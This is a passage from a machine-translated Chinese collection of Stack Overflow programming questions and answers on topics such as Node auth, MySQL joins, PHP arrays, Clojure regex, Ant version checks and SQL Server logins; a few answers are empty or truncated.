        NSLog(@"BackWard::%f",currentPlaybackRate);
        mp.moviePlayer.currentPlaybackRate=currentPlaybackRate;
    }
} 
```

# node.js - 如何使用基本身份验证登录到 node.js 服务器？

> ID：10514186
> 
> 赞同：1
> 
> 时间：2012-05-09T10:23:16.263
> 
> 标签：node.js

这是我登录 node.js 服务器的 js 代码：

```
$.get("http://localhost/login", { user: 'abc', pass: '123' }, function(sessionId)  
{  
    document.location.href = "info.html?sessionId=" + sessionId;  
}); 
```

我应该如何使用基本身份验证将用户密码发送到服务器？

# c++ - 如何在 C++ 中获取特定于平台的路径分隔符？

> ID：10514190
> 
> 赞同：9
> 
> 时间：2012-05-09T10:23:24.867
> 
> 标签：c++

如何在 C++ 中获取特定于平台的路径分隔符（*不是*目录分隔符），即在列表中组合多个路径所需的分隔符（例如`PATH`环境变量）。

在 Linux 下，这将是`:`, 在 Windows 下`;`。

换句话说，我正在寻找 Python `os.pathsep`、 Java`path.separator`或 PHP 的C++ 等效项`PATH_SEPARATOR`。

如果 Boost 提供这样的功能就好了，因为无论如何我们都在项目中使用它。如果没有，我想任何其他解决方案都会很好。

我所能找到的（在这里和其他地方）要么只是检索目录分隔符的方法（即`/`vs. `\`），要么与 C++ 以外的其他语言相关。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-09T11:02:44.753

根据评论，一种可能是使用预处理器：

```
#ifdef _WIN32
const std::string os_pathsep(";");
#else
const std::string os_pathsep(":");
#endif 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-09T10:39:27.090

除了使用预处理器之外，我能找到的唯一可移植方式是通过 Apache Portable Runtime：

[`apr_filepath_list_merge`](http://apr.apache.org/docs/apr/1.4/group__apr__filepath.html#ga8316896ab8e3901f9711d9d4cc89b373)和 [`apr_filepath_list_split`](http://apr.apache.org/docs/apr/1.4/group__apr__filepath.html#gaf259849de62ac172dde7dcbe73421500)

你可以看看这些是如何实现的，但我猜它只是一个预处理器定义。

# facebook - 如何创造成就

> ID：10514191
> 
> 赞同：0
> 
> 时间：2012-05-09T10:23:25.297
> 
> 标签：facebook, facebook-graph-api, facebook-opengraph, achievements

“每场比赛总共获得 1000 分，分配给他们的所有成就。”

这是否意味着，例如，我可以创建十个 100 分的成就，仅此而已，还是意味着如果我有一个 100 分的成就，我不能将其提供给超过 10 人？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-10T01:57:23.357

您的应用程序所有成就的总和有 1000 分的限制，因此如果您有 10 个成就，每个成就价值 100 分，那么您可以在 Facebook 中设置的成就已经用完。1000 点限制并不是所有用户之间的共享限制，它只是为了强制执行一个分配曲线，允许 Facebook 决定哪些成就更值得分享。

# mysql - MySQL：查询结果 [图片]

> ID：10514197
> 
> 赞同：0
> 
> 时间：2012-05-09T10:24:03.630
> 
> 标签：mysql

我几乎有我想要的数据......但需要帮助过滤它。（图片在底部）

下面的查询返回状态为 Member-id5 的所有记录，但我需要对其进行过滤。例如：如果我对 ect 做了一个简单的查询。( **exp_channel_titles** ) 对于**author_id** 323 我会得到 5 个结果。在这 5 个结果中，一行具有`status = 'Member-id5'`，另一行具有`status = 'complete'`AND `title = %Member%`（这是决定因素，其中包含完整和 Member 的行）。如果该行存在，则可以获取行的 entry_id`status = Member-id5`以用于在其中查找 ecd (exp_channel_data) 中的数据。关于我该怎么做的任何想法？附上图片

```
SELECT
             ect.entry_id
        ,    ect.author_id
        ,    ect.title
        ,    ect.status
        ,    ecd.field_id_13
        ,    ecd.field_id_14
        ,    ecd.field_id_15
        ,    ecd.field_id_25
        ,    ecd.field_id_27
        ,    ecd.field_id_28
        ,    ecd.field_id_29
        ,    ecd.field_id_30
        ,    ecd.field_id_31
        ,    ecd.field_id_32
        ,    ecd.field_id_33
        ,    ecd.field_id_34
        ,    ecd.field_id_35
        ,    exm.email
    FROM exp_channel_titles as ect
    LEFT JOIN exp_channel_data as ecd
      ON ecd.entry_id = ect.entry_id
    LEFT JOIN exp_members as exm
      ON exm.member_id = ect.author_id
WHERE ect.status = 'Members-id5' 
```

![在此处输入图像描述](../Images/3fc5fc03bf3fbe03efae3fc415e3da32.png)

图片只是在 exp_channel_titles 上完成的简单查询，323 为 author_id。它显示如何有多个结果以及我试图获得什么 entry_id 以完成我的查询。entry_id 496 是我想要的，基于 1\. 有一行 %Member% 并在其中完成。然后第 496 行的状态为 Members-id5。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T10:33:55.230

```
SELECT ...
FROM exp_channel_titles as ect
  JOIN exp_channel_titles as ect2
    ON (
          ect2.author_id = ect.author_id
      AND ect2.title LIKE '%Member%'
      AND ect2.status = 'complete'
    )
  ...
WHERE ect.status = 'Members-id5' 
```

# c# - 从字符串中针对 dtd 验证 xml

> ID：10514198
> 
> 赞同：-1
> 
> 时间：2012-05-09T10:24:19.593
> 
> 标签：c#, xml, dtd

我有一个引用本地 dtd 文件的 xml 文件。但问题是我的文件被压缩成一个文件（我正在使用 Unity3D，它将我所有的文本文件都放入一个二进制文件中）。这个问题不是 Unity3D 特定的，它对任何试图从字符串加载 DTD 模式的人都很有用。

我想到了一种解决方法来加载 xml 并分别加载 dtd，然后将 dtd 文件添加到我的文档的 XmlSchemas 中。像这样：

```
private void ReadConfig(string filePath)
{
    // load the xml file
    TextAsset text = (TextAsset)Resources.Load(filePath);
    StringReader sr = new StringReader(text.text);
    sr.Read(); // skip BOM, Unity3D catch!

    // load the dtd file
    TextAsset dtdAsset = (TextAsset)Resources.Load("Configs/condigDtd");

    XmlSchemaSet schemaSet = new XmlSchemaSet();
    schemaSet.Add(...); // my dtd should be added into this schemaset somehow, but it's only a string and not a filepath.

    XmlReaderSettings settings = new XmlReaderSettings() { ValidationType = ValidationType.DTD, ProhibitDtd = false, Schemas = schemaSet};
    XmlReader r = XmlReader.Create(sr, settings);

    XmlDocument doc = new XmlDocument();
    doc.Load(r);
} 
```

xml 是这样开始的，但是找不到 dtd。并不奇怪，因为 xml 文件是作为字符串加载的，而不是从文件中加载的。

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE Scene SYSTEM "configDtd.dtd"> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-09T11:15:00.663

`XmlSchema`有一个`Read`接受 a`Stream`和 a的方法`ValidationEventHandler`。如果 DTD 是字符串，则可以将其转换为流

```
System.Text.Encoding encode = System.Tet.Encoding.UTF8;
MemoryStream ms = new MemoryStream(encode.GetBytes(myDTD)); 
```

创建 XmlSchema

`XmlSchema mySchema = XmlSchema.Read(ms, DTDValidation);`

将此架构添加到`XmlDocument`包含您正在验证的 xml 中

```
myXMLDocument.Schemas.Add(mySchema);
myXMLDocument.Schemas.Compile();
myXMLDocument.Validate(DTDValidation); 
```

`DTDValidation()`处理程序将包含处理如果 xml 无效时要做什么的代码。

# python - 抓取编码为 iso-8859-1 而不是 utf-8 的网站：如何在我的数据库中存储正确的 unicode？

> ID：10514203
> 
> 赞同：1
> 
> 时间：2012-05-09T10:24:38.690
> 
> 标签：python, unicode, utf-8, beautifulsoup

我想使用 Python 抓取一个充满可怕问题的网站，其中一个是顶部的错误编码：

```
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"> 
```

这是错误的，因为该页面充满了如下内容：

`Nellâ€™ambito`

代替

`Nell'ambito`（请注意`â€™`更换`'`）

如果我理解正确，这是因为 utf-8 字节（可能是数据库编码）被解释为 iso-8859-1 字节（由元标记中的字符集强制）。[我在此链接http://www.i18nqa.com/debug/utf8-debug.html](http://www.i18nqa.com/debug/utf8-debug.html)找到了一些初步解释

我正在使用 BeautifulSoup 导航页面，Google App Engine 的 urlfetch 发出请求，但是我需要了解在我的数据库中存储字符串的正确方法是`â€™`通过将字符串编码为`'`.

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-09T11:55:06.900

# java - 带枚举的 XML 模式

> ID：10514204
> 
> 赞同：2
> 
> 时间：2012-05-09T10:24:41.163
> 
> 标签：java, xml, jaxb, xsd, xjc

我正在使用 XJC 从 XML Schema 创建一个 Jaxb 注释类。和

```
JAXBContext context = JAXBContext.newInstance(SomeClass.class);
Marshaller marshaller = context.createMarshaller();

StringWriter writer = new StringWriter();
marshaller.marshal(cardJob, writer);
String resultString = writer.getBuffer().toString(); 
```

我创建了一个 xml 输出字符串 - 这很完美。我想要实现的是，向此类添加一个枚举，例如

```
Jan (1, "January"),
Feb (2, "February"),

... 
```

通过在 xml 模式中创建一个条目并最终获得类似 <.January><./January> 的输出。可能是错误的，但类似于枚举条目名称中的 xml 元素。

帮助会非常好，因为我没有得到任何解决方案:(

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-08T16:58:10.953

也许您可以构建自己的 ContentHandler `org.xml.sax.ContentHandler`

处理枚举并在 endDocument 之前将它们放入缓冲区

`marshaller.marshal(obj, new yourContentHandler());`

# php - 整个php数组变成变量...或类似的东西

> ID：10514205
> 
> 赞同：0
> 
> 时间：2012-05-09T10:24:41.850
> 
> 标签：php, arrays

第一次在这里发帖。。

所以我是 php、mysql 和 JSON 的新手，我遇到了一些问题，我可能只是以不正确的方式解决问题，所以让我知道你的想法。

基本上有一个我正在尝试做的网站，它有一些位于另一台服务器上的信息，我使用 JSON 获取该信息。

这是代码：

```
//Start of JSON Main Content Fetch + Main Content Render 
//JSON send_recv of menu array. Assign results to $main_content_b_render
$main_content_fetch=send_recv("menu", array("id" => "17", "fetchContent" => TRUE));

//Renders menu from JSON results.
function render_main_content($main_content_fetch)
{

//Start of processing $menu_result
$main_content_b_render = $main_content_fetch['content'];
print_r($main_content_fetch);
    }
    render_main_content($main_content_fetch['results']);
    ?> 
```

我实际上可以从另一台服务器获得以下内容：

```
Array ( [id] => 17 [name] => Accessories [reference] => [content] => Array ( [0] => Array ( [type] => Heading1 [content] => BLAH BLAH BLAH TXT TXT TXT [scope] => DetailAndThumb [active] => 1 [reference] => [name] => accblurb ) [1] => Array ( [type] => Image [align] => Left [image] => http://URL.../image/43/webcontent/accshop11.jpg [thumb] => http://URL....com.au/image/thumb/100x100/43/webcontent/accshop11.jpg [scope] => DetailAndThumb [active] => 1 [reference] => [name] => accshop1.jpg ) ) ) 
```

我可以将数组值分配给一个变量，但它只会分配第一个值，例如：

如果我把它放在函数中并回显它 $id = $main_content_fetch['content']; 回声 $id;

我得到的只是'Array'，我真正想要的是位于返回信息后面的'BLAH BLAH BLAH TXT TXT TXT'，我们实际上是位于最后一组括号中的所有内容......

( [type] => Heading1 [content] => BLAH BLAH BLAH TXT TXT TXT [scope] => DetailAndThumb [active] => 1 [reference] => [name] => accblurb ) [1] => Array ( [ type] => Image [align] => Left [image] => [http://URL.../image/43/webcontent/accshop11.jpg](http://URL.../image/43/webcontent/accshop11.jpg) [thumb] => [http://URL....com. au/image/thumb/100x100/43/webcontent/accshop11.jpg](http://URL....com.au/image/thumb/100x100/43/webcontent/accshop11.jpg) [范围] => DetailAndThumb [活动] => 1 [参考] => [名称] => accshop1.jpg )

我想要做的是能够基本上将我得到的所有内容分配给一个变量，就像它一样。因为我认为我可以很容易地挑选出我想要的东西……而且我不知道还有其他方法可以做到这一点：/

对不起，如果它有点模糊，不太擅长解释自己，但我希望有人能锻炼我所说的并提供帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T10:30:51.837

这是你的功能。我只是用 return 替换了 print_r

```
function render_main_content($main_content_fetch)
{

//Start of processing $menu_result
$main_content_b_render = $main_content_fetch['content'];
return $main_content_fetch;
} 
```

假设您像这样调用此函数。现在您可以通过这种方式在单个变量中分配数组

```
$data = render_main_content($parameter);
$id = $data['id'];
$name = $data['name'];
...... 
```

希望这对您有所帮助。您所需要的只是将带有索引的数组变量分配给您想要的变量。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T10:30:10.500

你可以使用类似的东西

```
foreach (array_expression as $key => $value ) {
    // TODO - probably need a recursive version
    $$key = $value;
} 
```

遍历数组时，该语句允许您在代码中创建新变量。

但是，作为一项规则，您永远不应该依赖从其他服务器获得的输出格式。我的建议是从输入中明确提取您需要的信息，而不是按原样导入。

例如，你会做

```
$id = input['id']; 
```

然后，您可以检查是否所有内容都已正确分配并捕获任何错误。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-09T10:51:55.160

您可以使用以下 php 代码解决此问题

$value) { $$key = $value; } //或者.... foreach($user as $key=>$value) { ${$key} = $value; } ?>

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-09T11:02:18.123

抱歉，刚刚发现你有嵌套数组，为什么不通过 $main_content_fetch["content"][0]["content"] 访问所需的项目？无论如何，通过 print_r($arr, TRUE) 您可以打印实际项目并查看您正在处理的数组的结构。

如果我理解正确，为了获得 BLA BLA BLA 文本，您的代码应如下所示：

```
//Start of JSON Main Content Fetch + Main Content Render 
//JSON send_recv of menu array. Assign results to $main_content_b_render
$main_content_fetch=send_recv("menu", array("id" => "17", "fetchContent" => TRUE));

//Renders menu from JSON results.
function render_main_content($main_content_fetch)
{
     //Start of processing $menu_result
     $main_content_b_render = $main_content_fetch['content'];

     //return the second level "content"
     return $main_content_b_render[0]['content'];
}

$content = render_main_content($main_content_fetch['results']);
print $content;
?> 
```

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-05-09T10:32:55.853

调试时首先使用 print_r($arr, **TRUE** ) 打印您的数组，这将对您有很大帮助:-)（不要忘记 TRUE 标志！）。您可以像以前一样访问数组中的任何项目，但看起来您正在打印 $main_content_fetch 而不是 $main_content_b_render？

# linux - 如何在 Linux 上查找哪些进程已写入文件

> ID：10514206
> 
> 赞同：4
> 
> 时间：2012-05-09T10:24:45.540
> 
> 标签：linux, file

有没有办法找出哪个进程更早写入给定文件。我遇到了多个进程似乎正在写入文件的问题。我知道其中一个过程，但不确定还有谁在写入文件。我在 linux/ubuntu 上。操作系统是否可以通过日志记录哪些进程已写入指定文件

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-09T10:45:55.950

**创建一个小型监视进程**，该进程将定期记录当前正在访问该文件的人员。

您可以使用 fuser 编写一个小脚本。这是一个简单的例子（有待改进）

```
#!/bin/bash

log=~/file-access.log

while true
do
  fuser your_file >> $log
  sleep 0.2s
done 
```

但是你必须很幸运，写入这个文件的过程需要足够的时间才能有机会用 fuser 检测到它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-09T10:40:50.413

不，默认情况下没有任何东西可以跟踪事后哪些进程写入文件。

如果您可以随意复制，inotify 或类似工具可以帮助您监控谁在写入文件。

# zend-framework - Zend 库中同名文件和文件夹的目的是什么？

> ID：10514209
> 
> 赞同：-1
> 
> 时间：2012-05-09T10:25:11.467
> 
> 标签：zend-framework

如果您打开您的 zend 库，您可以看到名为 Acl 的文件夹以及 Acl.php 和 Zend 的其他库也是如此。我想知道为什么 Zend 这样做？这背后的逻辑是什么？？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-09T11:14:57.013

这是因为：

1.  类的命名约定
2.  类 <-> 文件名（路径）关系的约定

如果您有一个与其他类相关的类，则相应地命名它们是合乎逻辑的，例如`Zend_Form_Element`and `Zend_Form`。

现在你来看看类名和文件名/路径之间的关系。由于规则很简单：用文件路径替换`_`类名`/`，你最终得到：

`Zend_Form`-> `Zend/Form`(.php)

和

`Zend_Form_Element`-> `Zend/Form/Element`(.php)

这就是您获得文件`Form.php`和目录的方式`Form`。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-09T11:15:17.830

这样你就不需要写代码了`require_once'Zend/Acl.php'`

Zend 在 spl 自动加载器堆栈上注册它的自动加载器。当你这样做

```
$acl = new Zend_Acl(); 
```

没有 require 或 include 。PHP 要求 Zend 自动加载器找到可以找到 Zend_Acl 类定义的文件。Zend 自动加载器的回应是将输入“Zend_Acl”替换`'_'`为目录分隔符并在末尾添加“.php”扩展名并`include('Zend/Acl.php') ;`自行执行。

由于库目录是 php include_path 的一部分，因此它可以工作。

# ruby-on-rails - 在 Heroku 上的 Rails 缓存行为很奇怪

> ID：10514211
> 
> 赞同：1
> 
> 时间：2012-05-09T10:25:16.457
> 
> 标签：ruby-on-rails, ruby-on-rails-3, caching, heroku

我已经在视图上实现了片段缓存。更具体地说，在评论部分。它看起来像：

```
<% cache "video_#{@video.id}_comments" do %>
  <div id="comments">

    <%= render :partial => 'artists/videos/comments/comments' %>

  </div>
<% end %> 
```

在我的评论控制器中，创建动作，我有：

```
 ....
  if @comment.save
    expire_fragment("#{@comment.commentable.class.to_s.downcase}_#{@comment.commentable.id}_comments") 
```

在开发中，当创建新评论时。缓存已过期，当我重新加载页面时，新评论正常显示。

在 Heroku 上，情况并非如此。是因为我应该使用内存缓存吗？还是我在其他地方做错了什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-09T11:18:52.823

只是一个想法。你能试一下吗：

```
Rails.cache.delete("views/"#{@comment.commentable.class.to_s.downcase}_#{@comment.commentable.id}_comments") 
```

代替 expire_fragment

另外，我强烈建议在 heroku 中使用缓存存储。否则，默认值是**内存存储，它是 dyno 本地的，对其他 dyno 不可见**。此外，您的应用程序内存很快就会用完。另外，Heroku 提供的 dalli store 速度超级快。参考这个[文档](https://devcenter.heroku.com/articles/memcache)

# android - 如何获取为什么不想开始新活动的信息？

> ID：10514214
> 
> 赞同：0
> 
> 时间：2012-05-09T10:25:26.193
> 
> 标签：android, android-activity

简单的：

```
Uri uri=Uri.parse("geo:"+_lat+","+_lon);
startActivity(new Intent(Intent.ACTION_VIEW, uri)); 
```

`startActivity()`使我的应用程序崩溃（我知道为什么）。所以，我想了解为什么这个活动不想开始，并且（也许）通过 toast 显示一些信息，通过`showToast(msg)`.

PS：我是初学者。:)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-09T10:34:02.763

如果它崩溃了，那么就会出现异常。围绕您的`startActivity()`电话`try` `catch`并捕获异常。例外将为您提供所需的所有信息。您也可以`toast`从 catch 块中显示。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T10:40:38.213

您可以捕获由`RuntimeException`抛出的异常，`startActivity()`并且可以将异常写入`Toast`.

此代码可能会对您有所帮助。

```
try{
    //your code
    Uri uri=Uri.parse("geo:"+_lat+","+_lon);
    startActivity(new Intent(Intent.ACTION_VIEW, uri));
} catch (Exception e){
    Toast.makeText(context, e.getmessage(), duration).show();
} 
```

# java - 如何匹配 Clojure 中的多行正则表达式以解析 Groovy 源文件？

> ID：10514215
> 
> 赞同：1
> 
> 时间：2012-05-09T10:25:28.743
> 
> 标签：java, regex, groovy, clojure

我正在尝试在 Groovy 源文件上运行 Clojure 正则表达式来解析各个函数。

```
// gremlin.groovy

def warm_cache() {
  for (vertex in g.getVertices()) {
    vertex.getOutEdges()
  }
}

def clear() {
  g.clear()
} 
```

这是我在 Clojure 中使用的模式：

```
(def source (read-file "gremlin.groovy"))

(def pattern #"(?m)^def.*[^}]")   

(re-seq pattern source) 
```

但是，它只抓取第一行，而不是多行函数。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-09T11:27:43.233

作为演示如何从 中获取 AST `GroovyRecognizer`，并避免尝试使用正则表达式解析语言，您可以在 Groovy 中执行此操作：

```
import org.codehaus.groovy.antlr.*
import org.codehaus.groovy.antlr.parser.*

def code = '''
// gremlin.groovy

def warm_cache() {
  for (vertex in g.getVertices()) {
    vertex.getOutEdges()
  }
}

def clear() {
  g.clear()
}
'''

def ast = new GroovyRecognizer( new GroovyLexer( new StringReader( code ) ).plumb() ).with { p ->
  p.compilationUnit()
  p.AST
}

while( ast ) {
  println ast.toStringTree()
  ast = ast.nextSibling
} 
```

打印出 AST 中每个[GroovySourceAST](http://groovy.codehaus.org/api/org/codehaus/groovy/antlr/GroovySourceAST.html)节点的 AST，为您提供（对于本示例）：

```
 ( METHOD_DEF MODIFIERS TYPE warm_cache PARAMETERS ( { ( for ( in vertex ( ( ( . g getVertices ) ELIST ) ) ( { ( EXPR ( ( ( . vertex getOutEdges ) ELIST ) ) ) ) ) )
 ( METHOD_DEF MODIFIERS TYPE clear PARAMETERS ( { ( EXPR ( ( ( . g clear ) ELIST ) ) ) ) 
```

你应该可以用 Clojure 的 java interop 和 groovy-all jar 文件做同样的事情

* * *

### 编辑

要获得更多信息，您只需深入了解 AST 并稍微操作输入脚本。`while`将上述代码中的循环更改为：

```
while( ast ) {
  if( ast.type == GroovyTokenTypes.METHOD_DEF ) {
    println """Lines $ast.line to $ast.lineLast
              |  Name:  $ast.firstChild.nextSibling.nextSibling.text
              |  Code:  ${code.split('\n')[ (ast.line-1)..<ast.lineLast ]*.trim().join( ' ' )}
              |   AST:  ${ast.toStringTree()}""".stripMargin()
  }
  ast = ast.nextSibling
} 
```

打印出来：

```
Lines 4 to 8
  Name:  warm_cache
  Code:  def warm_cache() { for (vertex in g.getVertices()) { vertex.getOutEdges() } }
   AST:   ( METHOD_DEF MODIFIERS TYPE warm_cache PARAMETERS ( { ( for ( in vertex ( ( ( . g getVertices ) ELIST ) ) ( { ( EXPR ( ( ( . vertex getOutEdges ) ELIST ) ) ) ) ) )
Lines 10 to 12
  Name:  clear
  Code:  def clear() { g.clear() }
   AST:   ( METHOD_DEF MODIFIERS TYPE clear PARAMETERS ( { ( EXPR ( ( ( . g clear ) ELIST ) ) ) ) 
```

显然，该`Code:`部分只是重新连接在一起的行，因此如果粘贴回 groovy 中可能无法正常工作，但它们可以让您了解原始代码......

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-09T10:33:40.383

这是你的正则表达式，而不是 Clojure。您请求匹配`def`，然后是任何内容，然后是一个不等于右括号的字符。该字符可以在任何地方。你想要实现的是：`(?sm)def.*?^}`.

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-09T11:06:59.333

Short answer

```
(re-seq (Pattern/compile "(?m)^def.*[^}]" Pattern/MULTILINE) source) 
```

From [http://docs.oracle.com/javase/1.4.2/docs/api/java/util/regex/Pattern.html](http://docs.oracle.com/javase/1.4.2/docs/api/java/util/regex/Pattern.html)

> By default, the regular expressions ^ and $ ignore line terminators and only match at the beginning and the end, respectively, of the entire input sequence. If MULTILINE mode is activated then ^ matches at the beginning of input and after any line terminator except at the end of input. When in MULTILINE mode $ matches just before a line terminator or the end of the input sequence.

You need to be able to pass in

```
Pattern.MULTILINE 
```

when the pattern is compiled. But there is no option for this on re-seq, so you'll probably need to drop down into Java interop to get this to work properly? Ideally, you really should be able to specify this in Clojure land... :(

UPDATE: Actually, it's not all that bad. Instead of using the literal expression for a regex, just use Java interop for your pattern. Use `(re-seq (Pattern/compile "(?m)^def.*[^}]" Pattern/MULTILINE) source)` instead (assuming that you've imported java.util.regex.Pattern). I haven't tested this, but I think that will do the trick for you.

# php - 格式化查询输出：使用 sql 或 php 函数？

> ID：10514216
> 
> 赞同：2
> 
> 时间：2012-05-09T10:25:29.227
> 
> 标签：php, mysql, sql, format

我想知道是否有关于 SQL 输出格式的最佳实践。在 PHP 端还是在 SQL 语句本身中这样做更好？我的 SGBD 是 MySQL。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T10:58:22.627

“格式化”是什么意思？

如果您的问题是关于显示数据的方式（数据格式、货币格式等），请使用 PHP 进行格式化。格式化是表示层的责任。

如果您需要一些额外的计算，或者如果您需要汇总结果，最好的方法通常是使用数据库功能。您不需要将大量数据传输到应用程序服务器，您可以节省它的内存和处理器。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-09T11:21:03.277

除非您的格式**会影响排序**（见下文），否则您最好在 PHP 中进行所有格式设置。

*   通过所有应用程序层传递复杂/格式化的数据会给您带来某种障碍。您应该在将它们显示给用户之前传递简单/原始值并对其进行格式化。这样，您可以将这些值用于其他目的，而不仅仅是用于显示。

您希望在 SQL 中格式化数据的主要原因是当它**影响 item selection 或 order**时，例如：

```
SELECT complex_expression(x) as fx FROM t ORDER BY fx LIMIT 20 
```

*   *当 SQL 以某种方式限制或排序*返回数据集中的数据时，在 SQL 中进行数学运算很有用。如果你认为你可以在 PHP 中做同样的事情，你可能可以，但在 SQL 中通常要容易得多。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-09T10:30:21.557

取决于你需要什么样的格式。在 MySQL 中进行数学运算。比使用类似的 PHP 函数更快。如果您需要基本的日期格式，您可以在 MySQL 中完成，如果您需要高级格式，您最好使用 PHP。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-09T10:33:25.277

我将 mysql 用于小逻辑，例如你需要计数、添加和这些东西..

如果您需要进行复杂的计算，我会使用 PHP 来避免 SQL 服务器过载

# java - 如何在 Ant 脚本中检查 Ant 版本

> ID：10514222
> 
> 赞同：17
> 
> 时间：2012-05-09T10:26:26.270
> 
> 标签：java, ant

我的 ant 脚本仅适用于 >=1.8 版本。我想检查脚本中的版本，以便在安装较低版本时显示错误。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-05-24T21:06:25.623

这是一个可能有帮助的代码片段：

```
<property name="version.required" value="1.8" />

<target name="version_check">
    <antversion property="version.running" />
    <fail message="FATAL ERROR:  The running Ant version, ${version.running}, is too old.">
        <condition>
            <not>
                <antversion atleast="${version.required}" />
            </not>
        </condition>
    </fail>
</target>

<target name="doit" depends="version_check">
    <echo level="info" message="The running version of ant, ${version.running}, is new enough" />
</target> 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2014-10-28T14:39:49.393

无需创建目标，您可以在脚本开头使用[fail](https://ant.apache.org/manual/Tasks/fail.html) + [antversion ：](http://ant.apache.org/manual/Tasks/antversion.html)

```
<fail message="Ant 1.8+ required">
     <condition>
         <not><antversion atleast="1.8" /></not>
     </condition>
</fail> 
```

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2012-05-09T10:40:07.100

Ant 具有内置属性`ant.version`：

```
<project default="print-version">
    <target name="print-version">
        <echo>${ant.version}</echo>
    </target>
</project> 
```

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2012-05-09T18:44:53.540

ANT 1.7 版本引入了一个专门的[antversion](http://ant.apache.org/manual/Tasks/antversion.html)任务。

此功能是ANT 可以检查的几个[条件的一部分。](http://ant.apache.org/manual/Tasks/conditions.html)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-03-23T13:34:20.123

在终端类型中，只需执行：

```
ant -version 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2018-09-13T07:34:17.893

在构建脚本的开头添加以下内容：

```
<!-- Check Ant Version -->
<property name="ant.version.required"       value="1.9.8" />

<fail message="Ant version ${ant.version.required} or newer is required 
      (${ant.version} is installed)">
  <condition>
    <not><antversion atleast="${ant.version.required}" /></not>
  </condition>
</fail> 
```

如果 Ant 版本低于要求，则会产生如下错误：

> 需要 Ant 版本 1.9.8 或更高版本（已安装 2016 年 4 月 9 日编译的 Apache Ant(TM) 版本 1.9.7）

# sql - 允许访问 SQL Server？

> ID：10514226
> 
> 赞同：0
> 
> 时间：2012-05-09T10:26:39.190
> 
> 标签：sql, sql-server, sql-server-2008, security, tsql

我只是想知道是否有任何访问方法或规则来阻止人们访问数据库？我对 sql 很陌生，所以如果是这样，你将如何为数据库实现方法或规则？是通过数据库的属性，还是必须在某个地方用 SQL 脚本编写？

我正在使用 Microsoft SQL Server 2008。

任何帮助表示赞赏，在此先感谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-09T10:47:41.610

阅读有关登录名和用户的信息。

登录在服务器级别保护您，在数据库级别保护用户。用户通常会继承登录信息。

你可以在 SSMS 上看到它们：

![在此处输入图像描述](../Images/687faa4631dc694ac4eb63413df4df99.png)

写太多是没有意义的，因为你可以简单地谷歌它并找到大量的解释

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-09T10:50:07.517

在高水平：

要允许用户访问，您需要在服务器级别（高于您的数据库的级别）存在登录名。服务器级别将有一个“安全”节点，您可以在其中“添加登录”。根据您使用的是 windows 用户帐户（集成安全）还是 sql server 登录，登录的精确格式会有所不同，但添加的用户将希望与您使用的帐户格式相匹配。

一旦您根据服务器登录授予用户对服务器的访问权限，您就可以在数据库级别授予权限。数据库级别还将有一个“安全”节点，您可以在其中添加数据库级别的新登录。

数据库级登录需要匹配或映射到服务器级登录。

在数据库级别，您可以授予/拒绝各种权限，但通常会向用户授予角色，SQL 包括内置角色，例如“datareader”/“datawriter”，这些角色通常用于“通用访问”

Diego 发布的图像在 GUI 中说明了在哪里可以找到其中一些选项，但是排列很长，如果不知道您正在尝试做什么的一些细节，就很难再解释了。

# google-app-engine - 批量上传对象的祖先/父级

> ID：10514228
> 
> 赞同：0
> 
> 时间：2012-05-09T10:26:46.287
> 
> 标签：google-app-engine

我有一个简单的模型，我通常使用默认父键创建其实例（父级不是真实模型）。[这与GAE 教程](https://developers.google.com/appengine/docs/python/gettingstartedpython27/usingdatastore)中描述的方法相同

```
def simple_parent_key():
    return db.Key.from_path('simple', 'pathsimple')

class Simple(db.Model):
    """Basic simple model"""
    name = db.StringProperty() 
```

我通常在这样的发布请求中创建一个对象：

```
class AddSimple(webapp2.RequestHandler):
    def post(self):
        simple = Simple(parent=simple_parent_key())
        simple.name = self.request.get('name') 
```

现在我想使用 GAE 的批量上传方法添加一些对象。问题是，我没有找到为批量上传指定父/祖先键的方法。对象将在没有父对象的情况下创建，并且所有使用父键的查询都不会返回这些新对象。从而打破一致性。

有没有办法在批量上传文件中指定父键？

这是 bulkloader.yaml 文件的一部分：

```
transformers:
- kind: Simple
  connector: csv
  property_map:
    - property: name
      external_name: name 
```

上传工作正常，但没有任何父键，这是我想要的。

欢迎任何提示。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T18:13:02.210

